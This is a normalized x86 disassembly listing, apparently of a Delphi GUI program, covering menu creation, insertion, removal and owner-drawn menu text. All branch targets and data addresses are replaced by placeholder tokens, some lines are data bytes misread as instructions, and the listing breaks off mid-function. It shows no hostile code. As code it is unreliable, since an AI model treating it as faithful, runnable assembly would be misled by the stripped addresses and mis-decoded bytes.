mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_457380
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
mov eax esi
call sub_4549d8
test eax eax
jg r-xdata
mov edx esi
call sub_454d70
xor eax eax
mov [ esi + 0x64 ] eax
jmp r-xdata
xor edx edx
mov eax esi
call sub_4549e8
call sub_403234
cmp [ esi + 0x34 ] 0x0
je r-xdata
mov eax [ esi + 0x5c ]
call sub_403234
lea eax [ esi + 0x44 ]
call sub_40d524
lea eax [ esi + 0x78 ]
call sub_40d524
mov ax [ esi + 0x50 ]
test ax ax
je r-xdata
xor edx edx
mov eax esi
call sub_452dc4
mov eax [ esi + 0x34 ]
push eax
call DestroyMenu
mov eax [ esi + 0x4c ]
test eax eax
je r-xdata
movzx edx ax
xor ecx ecx
mov eax [ rw-data ]
call sub_41a994
mov edx ebx
and dl 0xfc
mov eax esi
call sub_420760
test bl bl
jle r-xdata
call sub_403234
pop esi
pop ebx
retn
mov eax esi
call sub_4035a8
sub_452a5c
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x1 ] cl
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_452cb7
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x3e ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_452cbe
lea eax [ ebp - 0x40 ]
call sub_404008
lea eax [ ebp - 0x8 ]
call sub_404008
retn
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x30 ]
call sub_4040a0
mov eax ebx
call sub_4549d8
test eax eax
jle r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
mov eax ebx
call sub_452f6c
mov [ ebp - 0x25 ] eax
jmp r-xdata
call GetVersion
and eax 0xff
cmp ax 0x4
jb r-xdata
mov esi [ ebx + 0x64 ]
test esi esi
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx r-xdata
call sub_404414
sete al
and eax 0x7f
mov esi [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x48 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x38 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x39 ]
or eax [ edx * 4 + rw-data ]
or esi eax
or esi 0x400
mov eax ebx
call sub_4549d8
test eax eax
jle r-xdata
mov [ ebp - 0x39 ] 0x2c
mov [ ebp - 0x35 ] 0x3f
mov eax ebx
call sub_454f94
mov esi eax
test esi esi
je r-xdata
push [ ebp - 0x8 ]
push r-xdata
lea edx [ ebp - 0x40 ]
mov ax [ ebx + 0x60 ]
call sub_4520c0
push [ ebp - 0x40 ]
lea eax [ ebp - 0x8 ]
mov edx 0x3
call sub_404388
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_4044c8
push eax
movzx eax [ ebx + 0x50 ]
push eax
push esi
push 0xffffffff
push edi
call InsertMenuA
mov eax [ ebx + 0x30 ]
call sub_4044c8
push eax
mov eax ebx
call sub_452f6c
push eax
or esi 0x10
push esi
push 0xffffffff
push edi
call InsertMenuA
jmp r-xdata
cmp [ ebx + 0x4c ] 0x0
je r-xdata
cmp [ esi + 0x40 ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_4033c0
test al al
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x4c ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_4545b0
test eax eax
jne r-xdata
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x30 ]
mov edx r-xdata
call sub_404414
sete al
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x3d ]
mov edx [ edx * 4 + rw-data ]
xor ecx ecx
mov cl [ ebx + 0x48 ]
or edx [ ecx * 4 + rw-data ]
or eax edx
xor edx edx
mov dl [ ebp - 0x1 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebp - 0x9 ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x31 ] eax
xor eax eax
mov al [ ebx + 0x38 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x39 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x3a ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x2d ] eax
movzx eax [ ebx + 0x50 ]
mov [ ebp - 0x29 ] eax
xor eax eax
mov [ ebp - 0x25 ] eax
xor eax eax
mov [ ebp - 0x21 ] eax
xor eax eax
mov [ ebp - 0x1d ] eax
mov eax [ ebp - 0x8 ]
call sub_4044c8
mov [ ebp - 0x15 ] eax
mov eax ebx
call sub_4549d8
test eax eax
jle r-xdata
lea eax [ ebp - 0x39 ]
push eax
push 0xffffffff
push 0xffffffff
push edi
call InsertMenuItemA
jmp r-xdata
mov eax ebx
call sub_452f6c
mov [ ebp - 0x25 ] eax
sub_452cd7
inc [ ecx ]
add [ eax ] al
add [ 0x55000000 ] ch
mov ebp esp
mov edx [ ebp + 0x8 ]
mov cl [ edx - 0x5 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x34 ]
call sub_452a5c
xor eax eax
pop ebp
retn
sub_452cfc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x70 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x70 ]
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_4565d0
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_455598
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_455a94
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax r-xdata
mov ecx [ ebp - 0x4 ]
call sub_452498
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov al 0x1
sub_452d6c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_452db6
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_41f33c
mov eax [ ebp - 0x4 ]
call sub_452320
mov edx eax
mov eax ebx
call sub_454a0c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_452dbd
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_452dc4
push ebx
mov ebx eax
test edx edx
je r-xdata
mov eax [ ebx + 0x68 ]
cmp edx eax
je r-xdata
test [ edx + 0x1c ] 0x8
jne r-xdata
pop ebx
retn
test eax eax
je r-xdata
mov eax edx
mov [ ebx + 0x68 ] eax
test eax eax
je r-xdata
xor ecx ecx
mov [ eax + 0x6c ] ecx
mov eax ebx
call sub_452e3c
mov [ eax + 0x6c ] ebx
mov edx ebx
call sub_4207e4
sub_452e00
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_420b64
mov eax ebx
call sub_4549c0
test eax eax
je r-xdata
cmp [ ebx + 0x74 ] 0x0
je r-xdata
mov eax ebx
call sub_4549c0
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_403430
pop esi
pop ebx
retn
mov eax ebx
call sub_452e3c
sub_452e3c
push ebx
push esi
push edi
push ebp
mov ebp eax
test [ ebp + 0x1c ] 0x8
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebp + 0x1c ] 0x2
je r-xdata
mov eax [ ebp + 0x6c ]
test eax eax
je r-xdata
mov [ ebp + 0x74 ] 0x1
jmp r-xdata
mov eax ebp
call sub_452f6c
push eax
call GetMenuItemCount
mov esi eax
test esi esi
sete bl
test esi esi
jle r-xdata
call sub_452e3c
jmp r-xdata
test bl bl
je r-xdata
push 0x400
mov edi esi
dec edi
push edi
mov eax ebp
call sub_452f6c
push eax
call GetMenuState
test al 0x4
jne r-xdata
cmp [ ebp + 0x64 ] 0x0
jne r-xdata
dec esi
test esi esi
jg r-xdata
push 0x400
push edi
mov eax ebp
call sub_452f6c
push eax
call RemoveMenu
mov bl 0x1
mov eax ebp
call sub_452cfc
mov eax [ ebp + 0x70 ]
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov eax ebp
call sub_452f6c
push eax
call GetMenuItemCount
test eax eax
jne r-xdata
mov eax [ ebp + 0x34 ]
push eax
call DestroyMenu
xor eax eax
mov [ ebp + 0x34 ] eax
jmp r-xdata
xor edx edx
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_452f0c
push ebx
push esi
push edi
push ebp
push ecx
mov ebx ecx
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_4549d8
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov edx ebp
mov eax edi
call sub_4549e8
cmp bl [ eax + 0x3f ]
jbe r-xdata
mov edx ebp
mov eax edi
call sub_4549e8
cmp bl [ eax + 0x3f ]
jae r-xdata
inc ebp
dec esi
jne r-xdata
mov edx ebp
mov eax edi
call sub_4549e8
mov [ eax + 0x3f ] bl
mov eax [ rw-data ]
call sub_452014
jmp r-xdata
cmp ebp [ esp ]
jge r-xdata
sub_452f6c
push ebx
mov ebx eax
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov eax [ ebx + 0x34 ]
pop ebx
retn
mov eax [ ebx + 0x4 ]
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
call CreateMenu
mov [ ebx + 0x34 ] eax
call CreatePopupMenu
mov [ ebx + 0x34 ] eax
jmp r-xdata
mov eax ebx
call sub_452cfc
mov eax [ rw-data ]
call sub_452014
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
sub_452fb8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_420a8c
push ebx
push sub_452d6c
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop esi
pop ebx
retn
sub_452ffc
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_4531e0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_454f94
mov edi eax
test edi edi
je r-xdata
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_4040a0
test bh 0x4
je r-xdata
mov eax edi
call sub_4565d0
test al al
je r-xdata
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404414
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
test bl 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_42438c
cmp [ esi + 0x3a ] 0x0
je r-xdata
test bh 0x4
jne r-xdata
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4042d0
mov eax [ ebp - 0xc ]
cmp [ eax ] 0x26
jne r-xdata
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
and ebx 0xffffffff
or ebx 0x2
jmp r-xdata
cmp [ esi + 0x39 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0xc ]
mov eax edi
call sub_423d64
mov edx eax
or dl [ r-xdata ]
mov eax edi
call sub_423d70
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4531e7
lea eax [ ebp - 0xc ]
call sub_404008
retn
mov eax [ ebp + 0x10 ]
mov esi eax
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add [ ebp - 0x18 ] 0x4
push 0x2
push 0x6
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4249b8
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x1 ] 0x0
jne r-xdata
or ebx 0x20000
and ebx 0xfffffffd
or ebx 0x0
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0xc ]
call sub_4042c8
push eax
mov eax [ ebp - 0xc ]
call sub_4044c8
push eax
mov eax [ ebp - 0x4 ]
call sub_4249b8
push eax
call DrawTextA
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x10 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_423aa4
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0xc ]
call sub_4042c8
push eax
mov eax [ ebp - 0xc ]
call sub_4044c8
push eax
mov eax [ ebp - 0x4 ]
call sub_4249b8
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
mov eax [ ebp + 0x10 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000010
call sub_423aa4
mov eax 0xff00000d
call sub_4235e4
mov esi eax
mov eax 0xff000010
call sub_4235e4
cmp esi eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_423aa4
jmp r-xdata
sub_45324c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_453b34
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424614
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001d
call sub_424270
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_423aa4
jmp r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov al [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_404414
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001e
call sub_424270
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424614
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] 0xfffffffc
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x8 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x41 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_450010
cmp ebx eax
jl r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov esi [ eax + 0x4c ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx eax [ eax + 0x38 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4249b8
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_424268
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_424270
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_428cdc
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4c ] eax
xor eax eax
push ebp
push sub_453693
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x7ff8
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_429dc4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff000012
call sub_423aa4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0xc ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_450010
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_424270
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424614
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_424268
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov edx 0xff000014
mov eax 0xff00000f
call sub_42ae20
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_424244
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424614
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x20 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
mov ax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x64 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x65 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424614
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424798
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x5c ]
lea edi [ edx - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0x10 ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x10 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov al [ eax + 0x39 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
